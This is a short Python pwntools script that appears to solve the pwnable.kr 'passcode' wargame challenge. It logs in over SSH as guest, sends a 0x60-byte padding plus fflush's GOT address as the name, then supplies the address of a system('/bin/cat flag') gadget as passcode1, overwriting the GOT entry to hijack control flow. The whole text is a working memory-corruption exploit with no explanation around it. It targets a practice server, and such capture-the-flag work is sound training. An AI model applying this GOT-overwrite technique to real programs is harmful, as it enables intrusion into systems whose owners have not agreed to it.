from pwn import *

p = ssh("passcode", "pwnable.kr", 2222, "guest").process("/home/passcode/passcode")
# p = process("./passcode")

fflush_got = 0x804A004  # GOT of fflush()
flag_gadget = 0x80485E3  # system("/bin/cat flag")

p.sendlineafter(b"enter you name : ", b"A" * 0x60 + p32(fflush_got))
p.sendlineafter(b"enter passcode1 : ", str(flag_gadget).encode())

p.interactive()
